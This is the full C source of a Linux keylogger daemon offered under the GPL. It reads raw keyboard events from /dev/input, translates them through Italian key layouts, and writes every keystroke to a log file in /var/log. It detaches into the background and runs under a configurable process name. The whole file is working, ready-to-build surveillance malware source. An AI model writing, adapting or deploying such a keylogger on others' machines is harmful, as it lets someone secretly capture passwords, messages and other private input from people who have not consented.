/**************************************************************************
 * Name:        Keylogger-Daemon-Linux                                    *
 * Description:	is a keylogger daemon for Linux-based OS that             *
 *              silently listens in the background for pressed            *
 *              keyboard buttons.                                         *
 * Author:      Emiliano Silvestri                                        *
 *                                                                        *
 * Copyright (C) 2021  Emiliano Silvestri                                 *
 *                                                                        *
 * This program is free software: you can redistribute it and/or modify   *
 * it under the terms of the GNU General Public License as published by   *
 * the Free Software Foundation, either version 3 of the License, or      *
 * (at your option) any later version.                                    *
 *                                                                        *
 * This program is distributed in the hope that it will be useful,        *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          *
 * GNU General Public License for more details.                           *
 *                                                                        *
 * You should have received a copy of the GNU General Public License      *
 * along with this program.  If not, see <https://www.gnu.org/licenses/>. *
 **************************************************************************/

#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <linux/input.h>

#include "keylogger.h"

#ifndef BUFFER_SIZE
#define BUFFER_SIZE		1024
#endif

#if BUFFER_SIZE < 32
#define BUFFER_SIZE		32
#endif

extern char **environ;

static const char *kb_log_name = DAEMON_NAME;
static const char *kb_input_path = "/dev/input/event" EVENT_NUMBER;

static int log_fd;
static ssize_t off = 0;
static char *buffer = NULL;

static inline __attribute__((always_inline))
int buffer_write(const char *src, size_t len)
{
	if ((off + len) >= BUFFER_SIZE)
	{
		if (write(log_fd, (const void *) buffer, off) == -1)
			return -1;
		off = 0;
	}
	memcpy((void *) &buffer[off], (const void *) src, len);
	off += len;
	return 0;
}

static int kb_log_daemon(void)
{
	int evt_fd;
	size_t len;
	struct input_event in_evt;

	unsigned int holding_shift = 0;
	unsigned int holding_r_alt = 0;
	unsigned int pressed_capslock = 0;

	if ((buffer = (char *) malloc(BUFFER_SIZE)) == NULL)
		return -1;

	if ((evt_fd = open(kb_input_path, O_RDONLY)) == -1)
	{
		free((void *) buffer);
		return -1;
	}

	if ((log_fd = open("keyboard.log", O_WRONLY|O_APPEND|O_CREAT, S_IRUSR|S_IWUSR)) == -1)
	{
		close(evt_fd);
		free((void *) buffer);
		return -1;
	}

	while (1)
	{
		if (read(evt_fd, (void *) &in_evt, sizeof(struct input_event)) == -1)
			break;

		if (in_evt.type == EV_KEY)
		{
			if (in_evt.value == 1)
			{
				if (in_evt.code == KEY_LEFTSHIFT | in_evt.code == KEY_RIGHTSHIFT)
					holding_shift = 1;
				else if (in_evt.code == KEY_RIGHTALT)
					holding_r_alt = 1;
				else if (in_evt.code == KEY_CAPSLOCK)
					pressed_capslock ^= 1;
				else if (holding_shift && holding_r_alt)
				{
					if ((len = strlen(ALT_IT_key_binding[in_evt.code])) > 0)
						if (buffer_write(ALT_IT_key_binding[in_evt.code], len) == -1)
							break;
				}
				else if (holding_shift)
				{
					if (pressed_capslock &&
						((in_evt.code >= KEY_Q && in_evt.code <= KEY_P) ||
							(in_evt.code >= KEY_A && in_evt.code <= KEY_L) ||
								(in_evt.code >= KEY_Z && in_evt.code <= KEY_M)))
					{
						if ((len = strlen(it_key_binding[in_evt.code])) > 0)
							if (buffer_write(it_key_binding[in_evt.code], len) == -1)
								break;
					}
					else if ((len = strlen(IT_key_binding[in_evt.code])) > 0)
						if (buffer_write(IT_key_binding[in_evt.code], len) == -1)
							break;
				}
				else if (holding_r_alt)
				{
					if ((len = strlen(ALT_it_key_binding[in_evt.code])) > 0)
						if (buffer_write(ALT_it_key_binding[in_evt.code], len) == -1)
							break;
				}
				else
				{
					if (pressed_capslock &&
						((in_evt.code >= KEY_Q && in_evt.code <= KEY_P) ||
							(in_evt.code >= KEY_A && in_evt.code <= KEY_L) ||
								(in_evt.code >= KEY_Z && in_evt.code <= KEY_M)))
					{
						if ((len = strlen(IT_key_binding[in_evt.code])) > 0)
							if (buffer_write(IT_key_binding[in_evt.code], len) == -1)
								break;
					}
					else if ((len = strlen(it_key_binding[in_evt.code])) > 0)
						if (buffer_write(it_key_binding[in_evt.code], len) == -1)
							break;
				}
			}
			else if (in_evt.value == 0)
			{
				if (in_evt.code == KEY_LEFTSHIFT | in_evt.code == KEY_RIGHTSHIFT)
					holding_shift = 0;
				else if (in_evt.code == KEY_RIGHTALT)
					holding_r_alt = 0;
			}
		}
	}

	close(log_fd);
	close(evt_fd);
	free((void *) buffer);

	return -1;
}

static void sigterm_handler(int sig)
{
	int out = 0;

	if (write(log_fd, (const void *) buffer, off) == -1)
		out = -1;

	close(log_fd);
	free((void *) buffer);

	exit(out);
}

static int start_kb_log(void)
{
	int fd;
	pid_t pid;
	pid_t sid;
	mode_t old_mask;

	sigset_t set;
	sigset_t old_set;
	struct sigaction act;
	struct sigaction old_act;

	if ((pid = fork()) < 0)
		return -1;
	else if (pid > 0)
		return 0;

	if (prctl(PR_SET_NAME, kb_log_name) < 0)
		return -1;

	if ((sid = setsid()) < 0)
		return -1;

	memset((void *) &act, 0, sizeof(struct sigaction));

	if (sigfillset(&set)) return -1;
	if (sigprocmask(SIG_BLOCK, &set, &old_set)) return -1;

	act.sa_mask = set;
	act.sa_handler = sigterm_handler;
	if (sigaction(SIGTERM, &act, &old_act)) return -1;

	if (sigemptyset(&set)) return -1;
	if (sigaddset(&set, SIGTERM)) return -1;
	if (sigprocmask(SIG_UNBLOCK, &set, NULL)) return -1;

	if ((pid = fork()) < 0)
		return -1;
	else if (pid > 0)
		return 0;

	old_mask = umask(0);

	if (chdir("/var/log") < 0)
		return -1;

	for (fd=sysconf(_SC_OPEN_MAX); fd>=0; fd--)
		close(fd);

	return kb_log_daemon();
}

static inline __attribute__((always_inline))
int check_priviledges(void)
{
	int i, ret = -1;

	if (environ != NULL)
	{
		i = ret = 0;

		while (environ[i] != NULL)
		{
			if (strncmp(environ[i], "SUDO_COMMAND", 12) == 0)
			{
				ret = 1;
				break;
			}
			else if (strncmp(environ[i], "USER=root", 9) == 0)
			{
				ret = 1;
				break;
			}

			i++;
		}
	}

	return ret;
}

int main(int argc, char *argv[])
{
	int ret;
	pid_t pid;
	FILE *pgrep;
	char cmd[32];

	if (argc < 2)
	{
		printf("No argument passed to program. Please, specify one of the following:  start | stop | status\n");
		return -1;
	}

	ret = snprintf(cmd, 32, "pgrep -x %s", kb_log_name);

	if (ret < 0 || ret >= 32)
	{
		printf("The buffer has not enough space to accommodate the specified daemon name.\n");
		return -1;
	}

	if ((pgrep = popen(cmd, "r")) == NULL)
	{
		printf("Unable to check if \"%s\" daemon is running or not.\n", kb_log_name);
		return -1;
	}

	ret = fscanf(pgrep, "%d", &pid);

	pclose(pgrep);

	if (strcmp(argv[1], "start") == 0)
	{
		if (ret == EOF)
		{
			ret = check_priviledges();

			if (ret == 0)
			{
				printf("Run with higher priviledges in order to start the \"%s\" daemon.\n", kb_log_name);
				return -1;
			}

			return start_kb_log();
		}
		else
			printf("The \"%s\" daemon is already running.\n", kb_log_name);
	}
	else if (strcmp(argv[1], "stop") == 0)
	{
		if (ret == EOF)
			printf("The \"%s\" daemon is not running.\n", kb_log_name);
		else
		{
			ret = check_priviledges();

			if (ret == 0)
			{
				printf("Run with higher priviledges in order to stop the \"%s\" daemon.\n", kb_log_name);
				return -1;
			}

			kill(pid, SIGTERM);
		}
	}
	else if (strcmp(argv[1], "status") == 0)
	{
		if (ret == EOF)
			printf("The \"%s\" daemon is not running.\n", kb_log_name);
		else
			printf("The \"%s\" daemon is running with PID: %d\n", kb_log_name, pid);
	}
	else
	{
		printf("The argument passed must match one of the following:  start | stop | status\n");
		return -1;
	}

	return 0;
}